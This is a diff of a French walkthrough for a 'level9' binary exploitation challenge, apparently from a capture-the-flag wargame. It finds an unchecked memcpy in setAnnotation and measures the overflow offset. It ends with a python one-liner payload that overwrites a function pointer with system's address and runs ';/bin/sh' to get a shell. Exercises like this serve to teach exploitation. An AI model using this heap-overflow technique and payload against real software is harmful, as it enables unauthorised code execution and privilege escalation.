@@ -1,17 +1,8 @@
 1. Je get le programme avec scp, et le decompile comme d'habitude.
-2. Nous pouvons voir que a la fin du programme, la fonction setAnnotation fais un strcpy sans verifier la taille qu'il copie
-3. Nous allons donc pouvoir manipuler avec un overflow
-4. Pour cela il me faut l'adresse de system et aussi l'adresse de "bin/sh" afin de la bind sur l'adresse de la fonction field_0 retourner par le main un l'adresse de system avec sur l'adresse du premier parametre "bin/sh"
- ```
- gdb ./level9
-(gdb) break main
-(gdb) run
-(gdb) p system
-(gdb) info proc mappings -> to get start and end adresse
-(gdb) find 0xb7e00000 (start address), 0xb7fc0000( end address), "/bin/sh"
-```
--> J'obtiens l'adresse ``0xb7d86060`` pour system et ``0xb7d47000`` -> start_address et  ``0xb7d47000`` -> end_address
+2. Nous pouvons voir que a la fin du programme, la fonction setAnnotation fais un memcpy sans verifier la taille qu'il copie
+3. Nous allons donc pouvoir overflow, pour cela j'ai besoin de l'offset entre v2 et v1 -> ltrace ./level9 "aaaa" -> et je soustrais les deux adresses de v2 et v1 pour l'avoir -> 108
+4. j'ai aussi besoin de l'adresse de system -> je la recupere avec gdb -> 0xb7d86060
+5. Nous pouvons maintenant construire l'exploit:
+Nous plaçons l'adresse de system au tout début de notre chaîne (dans v2). Ensuite, nous écrivons l'adresse 0x0804a00c (l'adresse exacte où memcpy commence à copier). Cela va écraser le pointeur de fonction de v1.Enfin, nous ajoutons ;/bin/sh.Au moment de l'appel final, le programme va lire le pointeur de v1 (qui vaut maintenant 0x0804a00c), se rendre à cette adresse, y trouver l'adresse de system et l'exécuter en lui passant toute la chaîne en argument. Le point-virgule permettra d'ignorer le début de la chaîne et d'exécuter directement /bin/sh
+(python -c 'print("\x60\x60\xd8\xb7" + "a" * 104 + "\x0c\xa0\04\x08" + ";/bin/sh" )') | ./level9
 
-Je peux maintenant chercher l'adresse de "bin/sh" dans la libc -> ``find 0xb7d47000, 0xb7eea000, "/bin/sh"`` -> qui me donne -> ``0xb7ea7c58``
-
-5. Je peux maintenant construire l'exploit: 
